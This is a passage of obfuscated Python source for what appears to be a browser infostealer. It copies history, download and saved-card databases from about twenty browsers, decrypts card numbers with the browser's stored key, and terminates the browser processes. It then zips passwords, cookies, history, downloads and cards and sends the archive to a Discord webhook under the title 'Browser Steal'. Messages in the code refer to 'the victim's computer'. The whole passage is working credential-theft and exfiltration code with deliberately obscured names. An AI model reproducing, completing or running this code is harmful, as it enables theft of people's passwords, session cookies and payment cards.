        if not os.path.exists(ZSQTUNVAPYZHCMYLPFWGVJCUSEKSCVKZKYENCAPHZRLCHQQEABEHEEYJXXHBRPXRELKDYEV):
            return
        
        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(ZSQTUNVAPYZHCMYLPFWGVJCUSEKSCVKZKYENCAPHZRLCHQQEABEHEEYJXXHBRPXRELKDYEV)
        disk_conn.backup(HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW)
        disk_conn.close()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ = HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.cursor()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW =          f"- Url     : {v4r_row[0]}"
            BSZAXLDCPKTYPFYPTEVRHQWYAQACCXJSPMIXYLKOYEVMIDBUHUCPVDWCHGGFQZDNJVJDJBOPQDXNMUPZ =        f"  Title   : {v4r_row[1]}"
            HXDUXHJOEFXRZRQLDSNQALYLHMDVNAKQNGRFAYQFWXFDMVOGBMVMKSWZJJVVPKDJDUIMSD =         f"  Time    : {v4r_row[2]}"
            RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name = f"  Browser : {RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX}"
            KOPYYHOAEQVTJHIFDOHOUZDFRNAKRUKFFCHNJBIHMOUYEJHYYUYISTMPCKJYONL.append(f"{WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW}\n{BSZAXLDCPKTYPFYPTEVRHQWYAQACCXJSPMIXYLKOYEVMIDBUHUCPVDWCHGGFQZDNJVJDJBOPQDXNMUPZ}\n{HXDUXHJOEFXRZRQLDSNQALYLHMDVNAKQNGRFAYQFWXFDMVOGBMVMKSWZJJVVPKDJDUIMSD}\n{RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name}\n")

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.close()

    def TPWBXMVFAVWNIOXJACWMJQLCLLBCVVBDDZGQBARSHFQAASPKIIGHDFRLTCMGPHGSVXQOTZKWTANIVZBRGQCQP(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB):
        MPRPUCVMMLAFINDAUCMTGNBQSEEBJITJHRMDHDFBNEDRXZGJDZLHTQVKILN = os.path.join(AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, 'History')
        if not os.path.exists(MPRPUCVMMLAFINDAUCMTGNBQSEEBJITJHRMDHDFBNEDRXZGJDZLHTQVKILN):
            return

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(MPRPUCVMMLAFINDAUCMTGNBQSEEBJITJHRMDHDFBNEDRXZGJDZLHTQVKILN)
        disk_conn.backup(HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW)
        disk_conn.close()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ = HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.cursor()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.execute('SELECT tab_url, target_path FROM downloads')
        for row in DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.fetchall():
            if not row[0] or not row[1]:
                continue
            WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV =         f"- Path    : {row[1]}"
            WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW =          f"  Url     : {row[0]}"
            RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name = f"  Browser : {RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX}"
            OUVAZRQTLSQDIQUIUERLHRRGNZHEHFKZEQPDJJAEJZBPYBDJAX.append(f"{WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV}\n{WVAGJJUBEPBWGPHTLTDCWJQEFYSFYZFRVMSARLYAOPIFFEOTUSWOIXVWIKRBKNZXKIFJIFAEGPVRZNKHPTAQDTXWKALLRGSW}\n{RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name}\n")

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.close()

    def SLJJZPLUADMPSQAAPFZKZFLTHKAAZUOMDSBGTPCRAUSPHAIHTVIJCIIWPGNIDEBFFEIVOOHBRXDNLSHVYLJD(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH):
        ZKTRCJDLLTCUUGZWIJFCJGSMNKDDZWOFEWVIQNSNJGQXROVMGNJWVNIPCG = os.path.join(AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, 'Web Data')
        if not os.path.exists(ZKTRCJDLLTCUUGZWIJFCJGSMNKDDZWOFEWVIQNSNJGQXROVMGNJWVNIPCG):
            return

        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW = sqlite3.connect(":memory:")
        disk_conn = sqlite3.connect(ZKTRCJDLLTCUUGZWIJFCJGSMNKDDZWOFEWVIQNSNJGQXROVMGNJWVNIPCG)
        disk_conn.backup(HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW)
        disk_conn.close()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ = HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.cursor()
        DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in DWPNXRWMMXZTOJJEWMPNMMIRNHWMMSOCZMSZKIBLODOFNFFKEARWLAVKAANSCUQTMOSUNUSIEBBBZLXADVIDHZ.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO =             f"- Name             : {v4r_row[0]}"
            LVTQTFLMAZWNZFRVOZNURGBBJFMYEFTWNJPPIWOTADBMDILMHNACBIATRUNRUCXXMY = f"  Expiration Month : {v4r_row[1]}"
            WRDURBZKMLBOEOCBUSDBDKXVIXZBLHSXRNBXDDCRIKCBVFAOCQTEI =  f"  Expiration Year  : {v4r_row[2]}"
            ZBCJXITHEPFMJGWYSEHAGEXJZPMIZEAQFYSWVZHSIADPFESDASPMLBGEALJTWECYVHSG =      f"  Card Number      : {ATAFEBVCMRWRXHGLMGQKGTQJBVSPMNFMRTQHMLCMROCQHFZVQKQVURSBJJUXW(v4r_row[3], BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH)}"
            VRSECXXAXVGDPESUDNMCDVUAZORTZVJTKBNNEADEBJETMGDYOYZQWMKGFBLIYXXC =    f"  Date Modified    : {v4r_row[4]}"
            RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name =     f"  Browser          : {RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX}"
            BARLEYQWAUZHRMRRBYFTFEDMORUGISNCQZQOAQVYLGQWHKIBGMVTFAGBDMQPNCDEELEGWBA.append(f"{XJCPEUDLGILGBDCDCPOFGVUBELKGFFUFPTYKGUVKLIECTUBECJUBLPIAGVTIDSIBJIOFWAO}\n{LVTQTFLMAZWNZFRVOZNURGBBJFMYEFTWNJPPIWOTADBMDILMHNACBIATRUNRUCXXMY}\n{WRDURBZKMLBOEOCBUSDBDKXVIXZBLHSXRNBXDDCRIKCBVFAOCQTEI}\n{ZBCJXITHEPFMJGWYSEHAGEXJZPMIZEAQFYSWVZHSIADPFESDASPMLBGEALJTWECYVHSG}\n{VRSECXXAXVGDPESUDNMCDVUAZORTZVJTKBNNEADEBJETMGDYOYZQWMKGFBLIYXXC}\n{RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX_name}\n")
        
        HNGDBTTFZEBVKIEOOJTJKUPPXXCMLDPFJHUKAOMAFYIAVDHQOPUALVGVBRJAW.close()

    def XKIFOVWXPDRJTNOAQTSRRCTYOEMRIAVGBMZZRNSUCOVGKEFBBGSNQMSCUEZQTWTOIWRSGHVEEAMWDJZO(VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX):
        files_in_memory = {}

        if VVUNXRABKJIICSLCDLGTONKTJVBYFTYDLJOFOQGWAOPAJUEBLDFUHLTSVRQCGQCYABOOADDVXGNNMYOXQMPSMXGDDJYJUHIDO:
            files_in_memory[f"Passwords_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt"] = '\n'.join(VVUNXRABKJIICSLCDLGTONKTJVBYFTYDLJOFOQGWAOPAJUEBLDFUHLTSVRQCGQCYABOOADDVXGNNMYOXQMPSMXGDDJYJUHIDO)

        if LYJUGPZNNISZAICNKKBEVMADLVAPVUVZKMEDEKWJWRPQGZPMVW:
            files_in_memory[f"Cookies_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt"] = '\n'.join(LYJUGPZNNISZAICNKKBEVMADLVAPVUVZKMEDEKWJWRPQGZPMVW)

        if KOPYYHOAEQVTJHIFDOHOUZDFRNAKRUKFFCHNJBIHMOUYEJHYYUYISTMPCKJYONL:
            files_in_memory[f"History_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt"] = '\n'.join(KOPYYHOAEQVTJHIFDOHOUZDFRNAKRUKFFCHNJBIHMOUYEJHYYUYISTMPCKJYONL)

        if OUVAZRQTLSQDIQUIUERLHRRGNZHEHFKZEQPDJJAEJZBPYBDJAX:
            files_in_memory[f"Downloads_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt"] = '\n'.join(OUVAZRQTLSQDIQUIUERLHRRGNZHEHFKZEQPDJJAEJZBPYBDJAX)

        if BARLEYQWAUZHRMRRBYFTFEDMORUGISNCQZQOAQVYLGQWHKIBGMVTFAGBDMQPNCDEELEGWBA:
            files_in_memory[f"Cards_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt"] = '\n'.join(BARLEYQWAUZHRMRRBYFTFEDMORUGISNCQZQOAQVYLGQWHKIBGMVTFAGBDMQPNCDEELEGWBA)

        zip_in_memory = io.BytesIO()
        with zipfile.ZipFile(zip_in_memory, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, file_content in files_in_memory.items():
                zipf.writestr(filename, file_content)
        
        zip_in_memory.seek(0)
        return zip_in_memory

    def AFHIYXCIUJNMUBUYYXUBDJLWKHNAWRPJKLDBERHQSVODHIVNTVUWXUAMSTVOKZNDWTLLNHMWFWGFMJP(VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX, zip_in_memory):
        HSHXQNITDRHLJNZNYMKACGRQNYRFAPVTPTMPVZACEVGUNHWANHZWIZEXCIXLHELZGZLFH = SyncWebhook.from_url(LQUXQACAYSISJCBUBHOCHNJJAERPJNEEXFPEBBGVUSBFKJRWOXLWIEDBADMCTGAXLXHRRZOEWUBIP)
        HSHXQNITDRHLJNZNYMKACGRQNYRFAPVTPTMPVZACEVGUNHWANHZWIZEXCIXLHELZGZLFH.send(
            embed=Embed(
                title=f'Browser Steal {MZVIGMGXUVAXUKCLGKDNXBUIHWTQLFHVFWRIZZGPSASITDFHPUFXJWINONFJZITXFJNMJPAXGTMNBZCNGCCLBJR}:',
                description=f"Found In **{'**, **'.join(ZIIDPONYNOCVFEGYXBBKKTCOYVOLPQTJLBAYNGLSJLCUBGYWJYGABPABQOZUJCYMXFPUAJDL)}**: ```📂 - Browser_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.zip\n├── 📄 - Cards_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt\n├── 📄 - Cookies_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt\n├── 📄 - Downloads_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt\n├── 📄 - History_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt\n└── 📄 - Passwords_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.txt```",
                color=VXMQMTIFNQFSZVWQCUARWNDMZHAQVHGSTCAJGPBAVLFDCNKIXKAMGROFUHIIQABQHXYZQTSEUDPCDSC,
            ).set_footer(
                text=WQPKAEYENELJACVEEVCAFHZZJZZZIBEMMIWIYJJEIJFGDMVJXBICBKRNQQJEWBIGFDKYSPOLSLJFFWIVGXTCPYZTPAWGLLISOUR,
                icon_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV
            ),
            file=File(fp=zip_in_memory, filename=f"Browser_{VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX}.zip"), 
            username=YYYOHRNFCZUEJNONFZXIFSDHTUJIEFBANBYFREWPBSQNGMDGOKLETGRJJSIQ, avatar_url=KKAWLEUXAKPTXELIVUQRJRNWZLGXXRACMOYXGZUABGXIGLPVTEOALCZRSPITYXDQIZWQBBPOIQMKZUV
        )
        
    GOAVMGPULEHODQXOFMJXXYCBQVVXVLBBRRDXMDNTCISTDDJIVRWHAFBOMHGQQBNOLFHAFBUCOGIJEGULJVLVUIFWLUYJBNCZ = {
        'Google Chrome': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Microsoft', 'Edge', 'User Data'),
        'Opera': os.path.join(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED, 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED, 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Vivaldi', 'User Data'),
        'Internet Explorer': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Microsoft', 'Internet Explorer'),
        'Amigo': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Amigo', 'User Data'),
        'Torch': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Torch', 'User Data'),
        'Kometa': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Kometa', 'User Data'),
        'Orbitum': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Orbitum', 'User Data'),
        'Cent Browser': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'CentBrowser', 'User Data'),
        '7Star': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, '7Star', '7Star', 'User Data'),
        'Sputnik': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Sputnik', 'Sputnik', 'User Data'),
        'Google Chrome SxS': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Google', 'Chrome SxS', 'User Data'),
        'Epic Privacy Browser': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Epic Privacy Browser', 'User Data'),
        'Uran': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'uCozMedia', 'Uran', 'User Data'),
        'Yandex': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Yandex', 'YandexBrowser', 'User Data'),
        'Iridium': os.path.join(USBLREOUCNUBDBTNZRPETAQCUQSQNRSXYZXWECGZAPDRVUWDYLJMPTTFEUOMUZEVKBRIBX, 'Iridium', 'User Data'),
        'Mozilla Firefox': os.path.join(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED, 'Mozilla', 'Firefox', 'Profiles'),
        'Safari': os.path.join(LAKVJETWCSYJASZHZQFYOMHHOUVLZOIKRYDIMXXOAUEYYMSLLQQEVJLKLNRZWAPWCVEDUVBYASXED, 'Apple Computer', 'Safari'),
    }

    GOAVMGPULEHODQXOFMJXXYCBQVVXVLBBRRDXMDNTCISTDDJIVRWHAFBOMHGQQBNOLFHAFBUCOGIJEGULJVLVUIFWLUYJBNCZ_Processes = {
        'Google Chrome': 'chrome.exe',
        'Microsoft Edge': 'msedge.exe',
        'Opera': 'opera.exe',
        'Opera GX': 'opera.exe',
        'Brave': 'brave.exe',
        'Vivaldi': 'vivaldi.exe',
        'Internet Explorer': 'iexplore.exe',
        'Amigo': 'amigo.exe',
        'Torch': 'torch.exe',
        'Kometa': 'kometa.exe',
        'Orbitum': 'orbitum.exe',
        'Cent Browser': 'centbrowser.exe',
        '7Star': '7star.exe',
        'Sputnik': 'sputnik.exe',
        'Google Chrome SxS': 'chrome.exe',
        'Epic Privacy Browser': 'epic.exe',
        'Uran': 'uran.exe',
        'Yandex': 'yandex.exe',
        'Iridium': 'iridium.exe',
        'Mozilla Firefox': 'firefox.exe',
        'Safari': 'safari.exe',
    }
        
    ZYPPWNVLZGWEAACDTJYDARGJVUVPSFWKGSLNUCTEOPFUYFOEPQNIKJUQUDIWISQOXVJBPELJQUDCDIINAPMMJA = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    try:
        for browser, proc_name in GOAVMGPULEHODQXOFMJXXYCBQVVXVLBBRRDXMDNTCISTDDJIVRWHAFBOMHGQQBNOLFHAFBUCOGIJEGULJVLVUIFWLUYJBNCZ_Processes.items():
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    if proc.name().lower() == proc_name.lower():
                        proc.terminate()
                except: pass
    except: pass

    for RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV in GOAVMGPULEHODQXOFMJXXYCBQVVXVLBBRRDXMDNTCISTDDJIVRWHAFBOMHGQQBNOLFHAFBUCOGIJEGULJVLVUIFWLUYJBNCZ.items():
        if not os.path.exists(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV):
            continue

        BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH = QSINRRTCOGNGDFKQLXUORAMBVXWPLFZJCIJMONFGHYKDFWSMCQTYXOJOLKSIPOOHPOLXPWMLLXHPNDCHVBABAUY(os.path.join(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV, 'Local State'))
        if not BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH:
            continue

        for v4r_profile in ZYPPWNVLZGWEAACDTJYDARGJVUVPSFWKGSLNUCTEOPFUYFOEPQNIKJUQUDIWISQOXVJBPELJQUDCDIINAPMMJA:
            AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB = os.path.join(WBLHFKVJBJWEWRJTFTXKEKUHPAOMAKRRKVYVXLLCRVQTOEGSWETKXDHPSZV, v4r_profile)
            if not os.path.exists(AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB):
                continue
            
            try: ZEKYMQASLAXTBVYYONWOCIKCEHCRSHCPQFHFPMIDFLWKWAPTOQODRAEJCN(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH)
            except: pass
            try: QZGWIWZVLTAMGIHHQZYMQGHCCYJXYSTURATJMADACAOYTCYCQORQUE(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH)
            except: pass
            try: QNWDWQMCBDXIQHMGKUHJDMKCOUCVMXHCUFEMWQXPKKSWVWZINIENDMHGUATCREXZX(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB)
            except: pass
            try: TPWBXMVFAVWNIOXJACWMJQLCLLBCVVBDDZGQBARSHFQAASPKIIGHDFRLTCMGPHGSVXQOTZKWTANIVZBRGQCQP(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB)
            except: pass
            try: SLJJZPLUADMPSQAAPFZKZFLTHKAAZUOMDSBGTPCRAUSPHAIHTVIJCIIWPGNIDEBFFEIVOOHBRXDNLSHVYLJD(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX, AQUIVFNARQROBFWVHMTMSDAUJDKRJCNFGVQVHJTPBXTESQPBYKXYUTKQXNEDGXOGTZSJBVECHKPEPUJOIRFKSMKHKNTNAB, BAQLBUJGUMIERFPUAEAZDCQLGOTSQFLTWFLEKAMYDAOXWPYWMRLIHLBNVSZPWYYH)
            except: pass

            if RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX not in ZIIDPONYNOCVFEGYXBBKKTCOYVOLPQTJLBAYNGLSJLCUBGYWJYGABPABQOZUJCYMXFPUAJDL:
                ZIIDPONYNOCVFEGYXBBKKTCOYVOLPQTJLBAYNGLSJLCUBGYWJYGABPABQOZUJCYMXFPUAJDL.append(RCXQQMVXQGPPBGFIQNDBAQJWYOGWUBKJGEVUPRMZVGQHSSSIMANZX)
            
    if not VVUNXRABKJIICSLCDLGTONKTJVBYFTYDLJOFOQGWAOPAJUEBLDFUHLTSVRQCGQCYABOOADDVXGNNMYOXQMPSMXGDDJYJUHIDO:
        VVUNXRABKJIICSLCDLGTONKTJVBYFTYDLJOFOQGWAOPAJUEBLDFUHLTSVRQCGQCYABOOADDVXGNNMYOXQMPSMXGDDJYJUHIDO.append("No passwords was saved on the victim's computer")
    if not LYJUGPZNNISZAICNKKBEVMADLVAPVUVZKMEDEKWJWRPQGZPMVW:
        LYJUGPZNNISZAICNKKBEVMADLVAPVUVZKMEDEKWJWRPQGZPMVW.append("No cookies was saved on the victim's computer")
    if not KOPYYHOAEQVTJHIFDOHOUZDFRNAKRUKFFCHNJBIHMOUYEJHYYUYISTMPCKJYONL:
        KOPYYHOAEQVTJHIFDOHOUZDFRNAKRUKFFCHNJBIHMOUYEJHYYUYISTMPCKJYONL.append("No history was saved on the victim's computer")
    if not OUVAZRQTLSQDIQUIUERLHRRGNZHEHFKZEQPDJJAEJZBPYBDJAX:
        OUVAZRQTLSQDIQUIUERLHRRGNZHEHFKZEQPDJJAEJZBPYBDJAX.append("No downloads was saved on the victim's computer")
    if not BARLEYQWAUZHRMRRBYFTFEDMORUGISNCQZQOAQVYLGQWHKIBGMVTFAGBDMQPNCDEELEGWBA:
        BARLEYQWAUZHRMRRBYFTFEDMORUGISNCQZQOAQVYLGQWHKIBGMVTFAGBDMQPNCDEELEGWBA.append("No card was saved on the victim's computer")

    zip_in_memory = XKIFOVWXPDRJTNOAQTSRRCTYOEMRIAVGBMZZRNSUCOVGKEFBBGSNQMSCUEZQTWTOIWRSGHVEEAMWDJZO(VACYVRGAGHJEJITXRENAKJGJOVOLPKKFAWJRUMSEMCEZVJCXZX)
